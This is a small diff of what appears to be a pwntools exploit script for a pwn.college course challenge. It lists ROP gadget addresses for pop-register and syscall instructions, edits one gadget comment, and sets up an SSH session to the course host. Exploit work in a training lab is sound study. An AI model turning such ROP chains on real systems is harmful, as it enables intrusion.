@@ -8,7 +8,7 @@ target_address_1 = 0x401664 #pop rax; ret;
 target_address_2 = 0x40168b #pop rdi; ret;
 target_address_3 = 0x401683 #pop rsi; ret;
 target_address_4 = 0x40166c #pop rdx; ret;
-target_address_5 = 0x401693 #syscall;
+target_address_5 = 0x401693 #syscall; ret;
 
 
 s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
